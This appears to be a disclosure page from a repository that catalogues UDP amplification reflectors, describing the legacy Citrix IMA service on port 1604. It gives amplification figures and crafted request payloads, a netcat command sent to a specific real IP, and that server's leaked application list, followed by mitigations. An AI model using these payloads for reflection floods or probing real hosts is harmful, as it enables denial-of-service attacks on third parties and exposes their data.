# Citrix Legacy IMA Service (XenApp Servers)

## Port: 1604

## Proto: UDP

## Amplification factor: ~7x (can go over 200x)

## Reflector count: ~830 (2nd Aug 2020)

---

- Citrix Independent Management Architecture Service that is bundled with Legacy versions of XenApp has UDP port 1604 open and will respond to specially crafted packets with an "Application" List.

- **This list of applications can exceed a single packet, and in the case of the example below, the server transmitted 40 packets with a total byte count of `19696`, thus the practical amplification of some devices is over 200x**. The average amplification factor of the initial packet is 7x.

- There exists another UDP packet construction that retrieves a server list however the response sizes are considerably less than Application list and will not be used in the example provided below. The raw data for a "Server" List request is: `\x2a\x00\x01\x32\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`.

- Citrix IMA Service (UDP) is vulnerable to CWE-406 as per usual in this repo.

### Example Requests / Responses

- Request: **42 data bytes** (Applications List request)

  - ASCII: `nothing human readable`

  - `> ~# echo -ne '\x2a\x00\x01\x32\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x21\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'|nc -u 69.164.152.97 1604 -w2`

- Response: **First packet 483 bytes in this case**, **500 bytes average**

  - ASCII character space: `�3���DE��a(1700 JR Demo24 Seven Brands Runit50 SQL26101 Botas Cuadra USA - USA26101 Botas Cuadra USA - mexico26101 Botas Cuadra USA Runit50 SQL26101 Webit2775 Vollante Runit50 SQL28001 Samba 2 Runit50 SQL28001 Samba 2 Utilerias2980Sixty Facturacion 3_32980Sixty Runit50sql298910 Cloe Miami Runit50 SQL298910 Cloe Miami Utilerias29893 Cloe Runit50 SQL29893 Cloe Utilerias29894 Cloe Stores FacturacionE29894 Cloe Stores Runit50 SQL`

  - Raw bytes (example only because of random discriminator): `db01043302fda8e30200064445a4986100000000000000000000000000000000110028000000000031373030204a522044656d6f00323420536576656e204272616e64732052756e697435302053514c00323631303120426f7461732043756164726120555341202d2055534100323631303120426f7461732043756164726120555341202d206d657869636f00323631303120426f74617320437561647261205553412052756e697435302053514c003236313031205765626974003237373520566f6c6c616e74652052756e697435302053514c0032383030312053616d626120322052756e697435302053514c0032383030312053616d62612032205574696c657269617300323938305369787479204661637475726163696f6e20335f33003239383053697874792052756e6974353073716c0032393839313020436c6f65204d69616d692052756e697435302053514c0032393839313020436c6f65204d69616d69205574696c657269617300323938393320436c6f652052756e697435302053514c00323938393320436c6f65205574696c657269617300323938393420436c6f652053746f726573204661637475726163696f6e4500323938393420436c6f652053746f7265732052756e697435302053514c00`

### Documentation

- XenApp's use of IMA Service: <https://carlwebster.com/citrix-xenapp-6-5-and-udp-port-1604/>
- Application resolution via UDP 1604 considered "legacy": <https://discussions.citrix.com/topic/67412-ica-published-application-issue/>
- Disabling UDP over 1604 via Access management console Server Farm settings: <https://discussions.citrix.com/topic/273073-port-1604-is-security-risk/>

### Mitigations

- No need to use this legacy service to retrieve application listing, please either disable service using the last `Documentation` section link provided or update XenApp instances in use.
- ACL block port UDP/1604 if no Citrix devices in use on the network.
